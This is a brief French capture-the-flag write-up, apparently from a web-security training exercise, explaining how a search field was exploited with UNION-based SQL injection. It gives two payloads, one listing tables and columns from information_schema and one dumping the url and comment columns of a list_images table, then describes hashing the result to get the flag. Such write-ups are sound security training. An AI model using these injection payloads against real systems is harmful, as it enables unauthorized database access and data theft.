## Comment j'ai exploité cette faille ?

Dans le champ de recherches mettre :

`1 UNION select table_name, column_name FROM information_schema.columns`

On obtient la liste des tables et des colonnes présentes dans la base de données. On peut y trouver la table list_images, et les colonnes url et comment.

Pour lister le contenu :

`1 UNION select url, comment FROM list_images`

On obtient une chaine de caractère à decoder en md5 puis encoder en sha256 pour obtenir le flag.
